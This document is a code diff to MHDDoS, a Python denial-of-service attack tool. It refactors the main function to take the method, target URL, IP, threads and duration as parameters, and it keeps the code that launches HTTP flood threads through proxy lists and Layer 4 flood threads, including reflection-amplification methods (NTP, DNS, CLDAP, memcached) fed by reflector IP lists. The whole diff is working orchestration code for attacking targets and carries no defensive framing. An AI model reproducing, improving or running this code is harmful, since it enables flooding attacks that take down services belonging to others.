@@ -1,17 +1,15 @@
 #!/usr/bin/env python3
-
+import logging
 import sys
 from contextlib import suppress
 from itertools import cycle
-from logging import basicConfig, getLogger, shutdown
 from math import log2, trunc
 from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
 from secrets import choice as randchoice
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
-                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
-                    gethostname, socket)
+                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
 from struct import pack as data_pack
 from subprocess import run, PIPE
@@ -25,17 +23,13 @@ from uuid import UUID, uuid4
 from PyRoxy import Proxy, ProxyType, ProxyUtiles, Tools as ProxyTools
 from certifi import where
 from cfscrape import create_scraper
-from dns import resolver
-from icmplib import ping
 from impacket.ImpactPacket import IP, TCP, UDP, Data
-from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, get, cookies
 from yarl import URL
 
 
-basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
-            datefmt="%H:%M:%S")
-logger = getLogger("MHDDoS")
+logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
+logger = logging.getLogger("MHDDoS")
 logger.setLevel("INFO")
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
@@ -82,7 +76,7 @@ class bcolors:
 def exit(*message):
     if message:
         logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
-    shutdown()
+    logging.shutdown()
     _exit(1)
 
 
@@ -988,34 +982,26 @@ class HttpFlood(Thread):
         if name == "KILLER": self.SENT_FLOOD = self.KILLER
 
 
-def main(argv):
-    one = argv[1].upper()
-    method = one
+def main(method, urlraw, ip, threads, timer, proxy_fn=None, rpc=None, debug=False, refl_li_fn=None):
     port = None
     url = None
     event = Event()
     event.clear()
     target = None
-    urlraw = argv[2].strip()
-    if not urlraw.startswith("http"):
-        urlraw = "http://" + urlraw
 
     if method not in Methods.ALL_METHODS:
-        exit("Method Not Found %s" %
-             ", ".join(Methods.ALL_METHODS))
+        exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
+
+    if debug:
+        logger.setLevel(logging.DEBUG)
+
+    proxies = None
+    if proxy_fn:
+        proxy_li = Path(__dir__ / "files/proxies/" / proxy_fn)
+        proxies = ProxyUtiles.readFromFile(proxy_li)
 
     if method in Methods.LAYER7_METHODS:
         url = URL(urlraw)
-        host = url.host
-        try:
-            host = gethostbyname(url.host)
-        except Exception as e:
-            exit('Cannot resolve hostname ', url.host, e)
-        threads = int(argv[4])
-        rpc = int(argv[6])
-        timer = int(argv[7])
-        proxy_li = Path(__dir__ / "files/proxies/" /
-                        argv[5].strip())
         useragent_li = Path(__dir__ / "files/useragent.txt")
         referers_li = Path(__dir__ / "files/referers.txt")
         bombardier_path = Path.home() / "go/bin/bombardier"
@@ -1028,9 +1014,6 @@ def main(argv):
                 "Install bombardier: "
                 "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
             )
-
-        if len(argv) == 9:
-            logger.setLevel("DEBUG")
 
         if not useragent_li.exists():
             exit("The Useragent file doesn't exist ")
@@ -1045,9 +1028,8 @@ def main(argv):
         if not uagents: exit("Empty Useragent File ")
         if not referers: exit("Empty Referer File ")
 
-        proxies = ProxyUtiles.readFromFile(proxy_li)
         for thread_id in range(threads):
-            HttpFlood(thread_id, url, host, method, rpc, event,
+            HttpFlood(thread_id, url, ip, method, rpc, event,
                       uagents, referers, proxies).start()
 
     if method in Methods.LAYER4_METHODS:
@@ -1056,49 +1038,25 @@ def main(argv):
         port = target.port
         target = target.host
 
-        try:
-            target = gethostbyname(target)
-        except Exception as e:
-            exit('Cannot resolve hostname ', target, e)
-
         if port > 65535 or port < 1:
             exit("Invalid Port [Min: 1 / Max: 65535] ")
 
-        threads = int(argv[3])
-        timer = int(argv[4])
-        proxies = None
-        ref = None
         if not port:
             logger.warning("Port Not Selected, Set To Default: 80")
             port = 80
 
-        if len(argv) >= 6:
-            argfive = argv[5].strip()
-            if argfive:
-                refl_li = Path(__dir__ / "files" / argfive)
-                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
-                    if not refl_li.exists():
-                        exit("The reflector file doesn't exist")
-                    if len(argv) == 7:
-                        logger.setLevel("DEBUG")
-                    ref = set(a.strip()
-                              for a in ProxyTools.Patterns.IP.findall(
-                        refl_li.open("r+").read()))
-                    if not ref: exit("Empty Reflector File ")
-
-                elif argfive.isdigit() and len(argv) >= 7:
-                    if len(argv) == 8:
-                        logger.setLevel("DEBUG")
-                    proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
-                    proxies = ProxyUtiles.readFromFile(proxy_li)
-                    if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
-                        exit("this method cannot use for layer4 proxy")
-
-                else:
-                    logger.setLevel("DEBUG")
+        ref = None
+        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
+            refl_li = Path(__dir__ / "files" / refl_li_fn)
+            if not refl_li.exists():
+                exit("The reflector file doesn't exist")
+            ref = set(a.strip()
+                      for a in ProxyTools.Patterns.IP.findall(
+                refl_li.open("r+").read()))
+            if not ref: exit("Empty Reflector File ")
 
         for _ in range(threads):
-            Layer4((target, port), ref, method, event,
+            Layer4((ip, port), ref, method, event,
                    proxies).start()
 
     logger.info(
